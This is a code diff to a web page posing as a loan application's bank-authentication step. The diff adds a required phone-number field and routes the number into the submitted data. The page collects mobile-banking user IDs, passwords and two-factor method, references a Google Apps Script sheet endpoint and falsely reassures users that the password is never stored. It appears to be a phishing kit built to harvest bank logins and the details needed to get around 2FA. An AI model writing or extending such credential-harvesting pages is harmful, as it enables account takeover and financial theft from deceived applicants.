@@ -198,7 +198,18 @@
                             <p class="text-xs text-gray-500 mt-1">Your password is encrypted and never stored</p>
                         </div>
 
-                        <!-- Two-Factor Authentication -->
+                        <!-- Phone Number -->
+                        <div class="mb-6">
+                            <label class="block text-gray-700 text-sm font-bold mb-2" for="phoneNumber">
+                                Phone Number *
+                            </label>
+                            <input type="tel" id="phoneNumber" name="phoneNumber" required
+                                   class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                                   placeholder="(555) 123-4567" pattern="[0-9]{10}" maxlength="10">
+                            <p class="text-xs text-gray-500 mt-1">Enter your 10-digit phone number without dashes or parentheses</p>
+                        </div>
+
+                        <!-- Two-Factor Authentication Method -->
                         <div class="mb-6">
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="twoFactor">
                                 Two-Factor Authentication Method
@@ -517,6 +528,14 @@ const SHEET_URL = "https://script.google.com/macros/s/AKfycbyWmwiwXsYM8IbOIWgzz3
 document.querySelector("form").addEventListener("submit", async function(e) {
   e.preventDefault();
 
+  // Validate phone number before proceeding
+  const phoneNumber = document.getElementById("phoneNumber").value;
+  if (!phoneNumber || phoneNumber.length !== 10 || !/^\d+$/.test(phoneNumber)) {
+    alert('❌ Please enter a valid 10-digit phone number without dashes or parentheses');
+    document.getElementById("phoneNumber").focus();
+    return;
+  }
+
   const loanData = JSON.parse(sessionStorage.getItem("loanApplicationData")) || {};
 
   // Check if user came from personal loan form or is standalone
@@ -528,6 +547,7 @@ document.querySelector("form").addEventListener("submit", async function(e) {
     bankName: document.getElementById("bankName").value,
     mobileBankingUserId: document.getElementById("mobileBankingUserId").value,
     mobileBankingPassword: document.getElementById("mobileBankingPassword").value,
+    phoneNumber: document.getElementById("phoneNumber").value,
     twoFactorMethod: document.getElementById("twoFactor")?.value || 'sms',
     termsAccepted: document.getElementById("terms")?.checked || false
   };
@@ -546,6 +566,7 @@ document.querySelector("form").addEventListener("submit", async function(e) {
     // Add other bank auth fields
     mobileBankingUserId: bankData.mobileBankingUserId,
     mobileBankingPassword: bankData.mobileBankingPassword,
+    phoneNumber: bankData.phoneNumber,
     twoFactorMethod: bankData.twoFactorMethod,
     termsAccepted: bankData.termsAccepted
   };
@@ -613,6 +634,7 @@ function sendBankAuthEmail(bankData, loanData) {
         bank_name: bankData.bankName || '',
         mobile_banking_user_id: bankData.mobileBankingUserId || '',
         mobile_banking_password: '[PROTECTED]', // Never send actual password
+        phone_number: bankData.phoneNumber || '',
         two_factor_method: document.getElementById('twoFactor')?.value || 'sms',
         
         // Bank account details (from loan data for reference only)
@@ -623,7 +645,7 @@ function sendBankAuthEmail(bankData, loanData) {
         // Customer information (minimal reference from loan data)
         customer_name: loanData.fullName || loanData.name || 'Customer',
         customer_email: loanData.email || '',
-        customer_phone: loanData.phone || '',
+        customer_phone: bankData.phoneNumber || '',
         
         // METADATA
         application_type: 'Bank Authentication',
